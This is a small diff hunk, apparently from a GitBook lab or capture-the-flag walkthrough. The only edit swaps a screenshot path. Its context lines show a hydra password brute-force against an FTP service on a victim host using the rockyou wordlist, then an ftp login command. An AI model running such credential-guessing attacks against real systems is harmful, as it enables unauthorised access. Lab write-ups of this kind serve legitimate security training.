@@ -53,7 +53,7 @@ vsftpd 3.0.3
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$VICTIM:10021
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 ```
 ftp $VICTIM  10021
